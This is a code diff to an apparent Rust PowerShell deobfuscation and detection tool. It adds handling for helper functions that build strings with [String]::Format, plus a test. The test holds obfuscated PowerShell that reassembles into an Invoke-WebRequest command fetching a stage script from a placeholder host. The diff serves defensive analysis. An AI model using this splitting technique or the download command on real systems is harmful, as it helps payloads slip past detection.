@@ -1107,6 +1107,14 @@ static PS_LITERAL_FORMAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_STRING_FORMAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Format\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+    )
+    .expect("ps literal string format extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3873,6 +3881,7 @@ fn expand_literal_concat_extractor_calls(text: &str) -> String {
         || !(text.contains('+')
             || lower.contains("string]::concat")
             || lower.contains("string]::join")
+            || lower.contains("string]::format")
             || lower.contains("-f"))
         || !text.contains('\'')
     {
@@ -3906,6 +3915,18 @@ fn expand_literal_concat_extractor_calls(text: &str) -> String {
                 let Some(expr) = caps.get(2) else { continue };
                 (expr, sep, None)
             } else if let Some(caps) = PS_LITERAL_FORMAT_EXTRACTOR_BODY_RE.captures(&body) {
+                let Some(template) = caps
+                    .get(1)
+                    .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
+                else {
+                    continue;
+                };
+                if template.len() > 8192 {
+                    continue;
+                }
+                let Some(expr) = caps.get(2) else { continue };
+                (expr, String::new(), Some(template))
+            } else if let Some(caps) = PS_LITERAL_STRING_FORMAT_EXTRACTOR_BODY_RE.captures(&body) {
                 let Some(template) = caps
                     .get(1)
                     .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
@@ -7861,6 +7882,7 @@ impl PsObfuscationSignals {
             && (text.contains('+')
                 || lower.contains("string]::concat")
                 || lower.contains("string]::join")
+                || lower.contains("string]::format")
                 || lower.contains("-f"))
             && text.contains('\'');
         let literal_index_extractor = has_function_def
@@ -10327,6 +10349,23 @@ Format-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps
                 "'Invoke-WebRequest -Uri https://ps-format-named-extractor.example/stage.ps1'"
             ),
             "named-argument format extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_string_format_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Format-Text($left,$middle,$right) {
+  return [System.String]::Format('{0}{1}{2}', $left,$middle,$right)
+}
+Format-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-string-format-named' -middle '-extractor'"#;
+
+        let out = expand_literal_concat_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-string-format-named-extractor.example/stage.ps1'"
+            ),
+            "named-argument [string]::Format extractor call was not rewritten:\n{out}"
         );
     }
 
